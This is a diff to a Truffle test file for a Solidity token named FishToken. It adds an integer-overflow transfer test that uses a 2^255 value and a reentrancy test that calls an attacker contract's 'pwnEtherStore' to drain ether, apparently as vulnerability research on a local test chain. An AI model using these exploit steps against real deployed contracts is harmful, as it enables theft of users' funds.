@@ -1,15 +1,20 @@
 const FishToken = artifacts.require("FishToken");
+const attacker = artifacts.require("attacker");
 contract('FishToken', async (accounts) => {
     const owner = accounts[0];
     const timePeriodInSeconds = 3600;
     const from = Math.floor(new Date() / 1000);
     const bigValue = web3.utils.toBN('57896044618658097711785492504343953926634992332820282019728792003956564819968');
     let instance;
+    let attack_instance;
     let result;
     const to = from + timePeriodInSeconds;
     before('setup contract for each test', async () => {
         instance = await FishToken.new(to, {from: accounts[0]});
-        console.log("contract_name:FishToken:" + instance.address)
+        console.log("contract_name:FishToken:" + instance.address);
+        attack_instance = await attacker.new(instance.address, {from: accounts[0]});
+        console.log("contract_name:attacker:" + attack_instance.address);
+
     });
     it('test 0', async () => {
         await instance.issueTokens({from: accounts[0], value: web3.utils.toWei(web3.utils.toBN(1))});
@@ -43,12 +48,27 @@ contract('FishToken', async (accounts) => {
     });
 
     it('attack_overflow', async () => {
+
+        console.log("Before Attack_overflow");
+        result = await instance.balanceOf(accounts[1]);
+        console.log("account[1]_balance : " + web3.utils.toWei(result));
+        result = await instance.balanceOf(accounts[3]);
+        console.log("account[3]_balance : " + web3.utils.toWei(result));
+
         await instance.transfer(accounts[1], bigValue, {from: accounts[3]});
         result = await instance.balanceOf(accounts[3]);
-        console.log(result.toString());
 
+        console.log("After Attack_overflow");
         result = await instance.balanceOf(accounts[1]);
-        console.log(result.toString());
+        console.log("account[1]_balance : " + web3.utils.toWei(result));
+        result = await instance.balanceOf(accounts[3]);
+        console.log("account[3]_balance : " + web3.utils.toWei(result));
+    });
+
+    it('attack_Re_entry', async () => {
+        console.log(await web3.eth.getBalance(attack_instance.address));
+        await attack_instance.pwnEtherStore({from: accounts[10], value: web3.utils.toWei(web3.utils.toBN(1))});
+        console.log(await web3.eth.getBalance(attack_instance.address));
     });
 });
 
